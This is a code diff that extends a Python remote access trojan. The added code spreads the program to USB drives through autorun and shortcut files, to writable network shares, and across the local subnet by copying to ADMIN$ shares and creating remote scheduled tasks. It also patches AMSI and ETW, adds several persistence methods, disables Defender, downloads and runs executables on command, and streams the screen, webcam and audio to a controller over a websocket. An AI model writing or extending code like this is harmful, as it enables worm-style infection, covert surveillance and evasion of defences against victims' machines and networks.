+                    dt = _K32.GetDriveTypeW(drive)
+                    if dt == 2:  # DRIVE_REMOVABLE
+                        exe_name = exe.split("\\")[-1]
+                        dest = drive + exe_name
+                        if not os.path.exists(dest):
+                            if _copy_to_path(exe, dest):
+                                _create_autorun_inf(drive, dest)
+                                _create_lnk_on_drive(drive, dest)
+                                _log(f"USB spread: infected {drive}")
+                        infected.add(drive)
+        except:
+            pass
+        _SPREADER_ACTIVE.wait(timeout=5)
+
+def _network_share_spreader():
+    """Enumerate and infect writable network shares."""
+    exe = _get_exe_path()
+    while _SPREADER_ACTIVE.is_set():
+        try:
+            # Use net view to find computers
+            result = subprocess.run(
+                ["net", "view", "/all"],
+                capture_output=True, text=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            if result.returncode != 0:
+                _SPREADER_ACTIVE.wait(timeout=120)
+                continue
+            shares = []
+            for line in result.stdout.splitlines():
+                line = line.strip()
+                # Parse share lines like: \\SERVER\ShareName  Disk
+                if line.startswith("\\\\"):
+                    parts = line.split()
+                    if parts and len(parts) >= 1:
+                        share_path = parts[0]
+                        # Filter to disk shares
+                        if not any(x in share_path.lower() for x in ["print$", "ipc$", "admin$"]):
+                            shares.append(share_path)
+            for share in shares:
+                try:
+                    dest = share + "\\WinSvcUpdate.exe"
+                    if not os.path.exists(dest.replace("\\\\", "\\\\")):
+                        # Map drive and copy
+                        _copy_to_unc(share, exe)
+                        _log(f"Share spread: {share}")
+                except:
+                    pass
+        except:
+            pass
+        _SPREADER_ACTIVE.wait(timeout=300)
+
+def _copy_to_unc(unc_path, local_exe):
+    """Copy exe to UNC path using PowerShell (robust for auth)."""
+    try:
+        dest = unc_path + "\\WinSvcUpdate.exe"
+        ps = (
+            "$s='" + local_exe.replace("'","''") + "';"
+            "$d='" + dest.replace("'","''") + "';"
+            "Copy-Item -LiteralPath $s -Destination $d -Force -ErrorAction 0"
+        )
+        b64 = base64.b64encode(ps.encode("utf-16le")).decode()
+        subprocess.run(
+            ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+            capture_output=True, timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        # Try to create remote scheduled task
+        parts = unc_path.split("\\")
+        if len(parts) >= 3:
+            server = parts[2]
+            _remote_exec_schtasks(server, dest)
+        return True
+    except:
+        return False
+
+def _remote_exec_schtasks(server, exe_path):
+    """Create scheduled task on remote machine via schtasks."""
+    try:
+        task_name = "WinSvcUpdate"
+        subprocess.run(
+            ["schtasks", "/create", "/s", server, "/tn", task_name,
+             "/tr", exe_path, "/sc", "onlogon", "/rl", "highest", "/f"],
+            capture_output=True, timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        subprocess.run(
+            ["schtasks", "/create", "/s", server, "/tn", task_name + "Health",
+             "/tr", exe_path, "/sc", "minute", "/mo", "15", "/rl", "highest", "/f"],
+            capture_output=True, timeout=30,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+    except:
+        pass
+
+def _lan_worm_scan():
+    """Scan local subnet for SMB (445) and attempt psexec-style spread."""
+    exe = _get_exe_path()
+    while _SPREADER_ACTIVE.is_set():
+        try:
+            # Determine local subnet
+            hostname = socket.gethostname()
+            local_ip = socket.gethostbyname(hostname)
+            parts = local_ip.split(".")
+            if len(parts) != 4:
+                _SPREADER_ACTIVE.wait(timeout=300)
+                continue
+            subnet = ".".join(parts[:3])
+            _log(f"LAN worm: scanning {subnet}.0/24 on port 445...")
+            open_hosts = []
+            # Quick scan of subnet (try common hosts first)
+            for i in range(1, 255):
+                ip = f"{subnet}.{i}"
+                if ip == local_ip:
+                    continue
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.5)
+                    result = s.connect_ex((ip, 445))
+                    s.close()
+                    if result == 0:
+                        open_hosts.append(ip)
+                except:
+                    pass
+            _log(f"LAN worm: found {len(open_hosts)} hosts with SMB open")
+            for ip in open_hosts:
+                # Try to copy via ADMIN$
+                unc = f"\\\\{ip}\\ADMIN$\\WinSvcUpdate.exe"
+                try:
+                    ps = (
+                        "$s='" + exe.replace("'","''") + "';"
+                        "$d='" + unc.replace("'","''") + "';"
+                        "Copy-Item -LiteralPath $s -Destination $d -Force -ErrorAction 0;"
+                        "if(Test-Path $d){"
+                        "schtasks /create /s " + ip + " /tn WinSvcUpdate /tr $d /sc onlogon /rl highest /f"
+                        "}"
+                    )
+                    b64 = base64.b64encode(ps.encode("utf-16le")).decode()
+                    subprocess.run(
+                        ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+                        capture_output=True, timeout=60,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+                    _log(f"LAN worm: spread to {ip}")
+                except:
+                    pass
+        except:
+            pass
+        _SPREADER_ACTIVE.wait(timeout=600)
+
+def _spreader_init():
+    """Start all replication threads."""
+    if not _SPREADER_ACTIVE.is_set():
+        return
+    threading.Thread(target=_usb_spreader_loop, daemon=True).start()
+    threading.Thread(target=_network_share_spreader, daemon=True).start()
+    threading.Thread(target=_lan_worm_scan, daemon=True).start()
+    _log("Spreader engine active (USB + shares + LAN)")
+
+# ─── Init all immortality features ────────────────────────────
+
+def _immortality_init():
+    _log("Initializing immortality suite...")
+    _patch_amsi()
+    _patch_etw()
+    if not _create_mutex():
+        _log("Mutex exists — already running or collision")
+    _registry_persistence()
+    _install_service()
+    _scheduled_tasks_persistence()
+    _dead_mans_switch()
+    _ads_hide()
+    _start_watchdog()
+    _wmi_persistence()
+    _spreader_init()
+    threading.Thread(target=_handle_revocation_loop, daemon=True).start()
+    threading.Thread(target=_dead_mans_switch_updater, daemon=True).start()
+    _log("Immortality suite initialized")
+
+# ─── Redefine install_persistence to use enhanced version ──────
+
+def enhanced_install_persistence():
+    _immortality_init()
+
 # ─── Main Loop ────────────────────────────────────────────────
 
 
@@ -927,9 +1868,14 @@ async def main():
             _log(f"Connecting to {uri}")
             async with websockets.connect(uri, **ws_kw) as ws:
                 lock_ws = asyncio.Lock()
+                lock_stream = asyncio.Lock()
 
                 async def send_ws(data):
                     async with lock_ws:
+                        await ws.send(data)
+
+                async def send_stream(data):
+                    async with lock_stream:
                         await ws.send(data)
 
                 with mss.mss() as s:
@@ -1035,38 +1981,16 @@ async def main():
                                             )
                                             continue
 
-                                    ps_cmd = _shell_ps_command(cmdline, cdir)
-                                    timeout_s = 55 if shell_id == "pop" else 120
+                                    timeout_s = 90 if shell_id == "pop" else 120
+                                    # Send immediate status so dashboard shows "running..."
+                                    await send_ws(
+                                        json.dumps({"cmd": CMD_SHELL, "data": {"out": None, "shellId": shell_id, "status": "running"}})
+                                    )
 
-                                    def _run_powershell_sync():
-                                        proc = None
-                                        try:
-                                            proc = subprocess.Popen(
-                                                _powershell_argv(ps_cmd),
-                                                stdin=subprocess.DEVNULL,
-                                                stdout=subprocess.PIPE,
-                                                stderr=subprocess.STDOUT,
-                                                text=True,
-                                                encoding="utf-8",
-                                                errors="replace",
-                                                cwd=cdir if cdir else None,
-                                                creationflags=0x08000000,
-                                            )
-                                            return proc.communicate(timeout=timeout_s)[0] or ""
-                                        except subprocess.TimeoutExpired:
-                                            if proc is not None:
-                                                try:
-                                                    proc.kill()
-                                                except Exception:
-                                                    pass
-                                            hint = ""
-                                            if shell_id == "pop" and cdir:
-                                                hint = " Tip: slow or removable drives can hang at the root; try a subfolder or use Get-ChildItem -Force.\n"
-                                            return f"(error) Command timed out ({timeout_s}s).{hint}\n"
-                                        except Exception as ex:
-                                            return f"(error) {ex}\n"
+                                    def _run_shell():
+                                        return _run_shell_sync(cmdline, cdir, timeout_s, shell_id)
 
-                                    out = await asyncio.to_thread(_run_powershell_sync)
+                                    out = await asyncio.to_thread(_run_shell)
                                     await send_ws(
                                         json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": shell_id}})
                                     )
@@ -1233,18 +2157,78 @@ async def main():
                                 elif cmd == CMD_URL:
                                     webbrowser.open(a.get("url", ""))
                                 elif cmd == CMD_DL_EXE:
+                                    url = a.get("url", "")
+                                    filename = a.get("name", "update.exe")
+                                    args = a.get("args", "")
+                                    run_in_terminal = a.get("terminal", False)
 
-                                    def _dl_sync():
+                                    def _dl_run_sync():
                                         import urllib.request
-                                        dest = os.path.join(os.environ.get("TEMP", "."), "update.exe")
-                                        urllib.request.urlretrieve(a.get("url", ""), dest)
-                                        return dest
+                                        dest = os.path.join(os.environ.get("TEMP", "."), filename)
+                                        try:
+                                            urllib.request.urlretrieve(url, dest)
+                                        except Exception as e:
+                                            return f"(error) Download failed: {e}\n"
+                                        if not os.path.exists(dest):
+                                            return "(error) File not found after download\n"
+                                        try:
+                                            _K32.SetFileAttributesW(dest, 0x02)
+                                        except:
+                                            pass
+                                        if run_in_terminal:
+                                            cmdline = f'"{dest}" {args}'
+                                            full_cmd = f'Start-Process -FilePath "{dest}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit code 0"}}else{{echo "[FAIL] Exit code $LASTEXITCODE"}}'
+                                            b64 = base64.b64encode(full_cmd.encode("utf-16le")).decode()
+                                            p = subprocess.Popen(
+                                                ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+                                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                                text=True, encoding="utf-8", errors="replace",
+                                                creationflags=0x08000000,
+                                            )
+                                            out, _ = p.communicate(timeout=120)
+                                            return out or "(no output)\n"
+                                        else:
+                                            subprocess.Popen(
+                                                f'"{dest}" {args}'.strip(),
+                                                shell=True, creationflags=0x08000000
+                                            )
+                                            return f"[OK] Launched: {filename}\n"
 
                                     try:
-                                        dl_path = await asyncio.to_thread(_dl_sync)
-                                        subprocess.Popen(dl_path, creationflags=0x08000000)
+                                        out = await asyncio.to_thread(_dl_run_sync)
+                                        d = {"cmd": CMD_DL_EXE, "data": {"out": out}}
+                                        await send_ws(json.dumps(d))
+                                    except subprocess.TimeoutExpired:
+                                        await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": "(error) Command timed out (120s)\n"}}))
                                     except Exception as ex:
                                         _log(f"CMD_DL_EXE: {ex}")
+                                        await send_ws(json.dumps({"cmd": CMD_DL_EXE, "data": {"out": f"(error) {ex}\n"}}))
+                                elif cmd == CMD_RUN_EXE:
+                                    path = a.get("path", "")
+                                    args = a.get("args", "")
+                                    show_in_terminal = a.get("terminal", False)
+                                    if show_in_terminal:
+                                        ps_cmd = f'Start-Process -FilePath "{path}" -ArgumentList \'{args}\' -Wait -NoNewWindow; if($?){{echo "[OK] Exit 0"}}else{{echo "[FAIL] Exit $LASTEXITCODE"}}'
+                                        b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
+                                        def _run_term():
+                                            p = subprocess.Popen(
+                                                ["powershell", "-NoP", "-Ep", "Bypass", "-Enc", b64],
+                                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                                text=True, encoding="utf-8", errors="replace",
+                                                creationflags=0x08000000,
+                                            )
+                                            return p.communicate(timeout=120)[0] or ""
+                                        out = await asyncio.to_thread(_run_term)
+                                        await send_ws(json.dumps({"cmd": CMD_SHELL, "data": {"out": out, "shellId": "side"}}))
+                                    else:
+                                        subprocess.Popen(f'"{path}" {args}'.strip(), shell=True, creationflags=0x08000000)
+                                elif cmd == CMD_DISABLE_DEFENDER:
+                                    def _defender_sync():
+                                        return _disable_defender()
+                                    out = await asyncio.to_thread(_defender_sync)
+                                    await send_ws(
+                                        json.dumps({"cmd": CMD_SHELL, "data": {"out": out + "\n", "shellId": "side"}})
+                                    )
                                 elif cmd == CMD_PING:
                                     pass
                             except ConnectionClosed:
@@ -1281,7 +2265,7 @@ async def main():
                                 _, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                                 blob = b"\x01" + jpg.tobytes()
                                 if _view_mode == "cam":
-                                    await send_ws(blob)
+                                    await send_stream(blob)
                                 if _cam_stream_enabled:
                                     await send_cam(blob)
                             except ConnectionClosed:
@@ -1306,12 +2290,12 @@ async def main():
                                             )
                                             return b"\x01" + buf.getvalue()
 
-                                    await send_ws(await asyncio.to_thread(_grab_screen_jpeg))
+                                    await send_stream(await asyncio.to_thread(_grab_screen_jpeg))
 
                                 if _audio_enabled:
                                     pkt = _audio_try_pop()
                                     if pkt:
-                                        await send_ws(pkt)
+                                        await send_stream(pkt)
                                         if _cam_stream_enabled:
                                             await send_cam(pkt)
                             except ConnectionClosed:
@@ -1363,7 +2347,7 @@ async def main():
         await asyncio.sleep(delay)
         retry_count += 1
 if __name__ == "__main__":
-    install_persistence()
+    enhanced_install_persistence()
     check_lock_state()
     _loop = asyncio.new_event_loop()
     asyncio.set_event_loop(_loop)
